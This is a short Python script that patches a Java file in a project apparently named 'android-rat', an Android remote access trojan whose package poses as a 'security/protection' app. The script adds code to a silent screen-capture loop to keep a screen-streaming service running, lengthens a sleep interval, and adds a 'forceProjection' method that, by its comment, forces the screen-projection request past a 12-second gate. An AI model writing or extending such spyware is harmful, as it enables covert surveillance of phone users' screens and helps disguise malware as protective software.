import shutil
J = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
shutil.copyfile(J, J + ".bak_proj2")
s = open(J, encoding="utf-8").read()
assert "forceProjection" not in s, "ya parcheado"

o = "            while (silentScreenActive) {\n                try {\n"
assert s.count(o) == 1
s = s.replace(o, o + "                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && instance != null && !ScreenStreamService.isActive()) {\n                        try { ScreenStreamService.ensure(instance); } catch (Throwable ignored) {}\n                    }\n")

o2 = "                            Thread.sleep(10);"
assert s.count(o2) == 1
s = s.replace(o2, "                            Thread.sleep(40);")

o3 = "    public static void stopSilentScreenCapture() {"
assert s.count(o3) == 1
s = s.replace(o3, "    /** [KRYPTOS] Forca o pedido de projecao ignorando o gate de 12s. */\n    public static void forceProjection(Context ctx) {\n        try { ScreenStreamService.forceEnsure(ctx); } catch (Throwable ignored) {}\n    }\n\n    public static void stopSilentScreenCapture() {")

open(J, "w", encoding="utf-8").write(s)
print("PASO 5a OK")
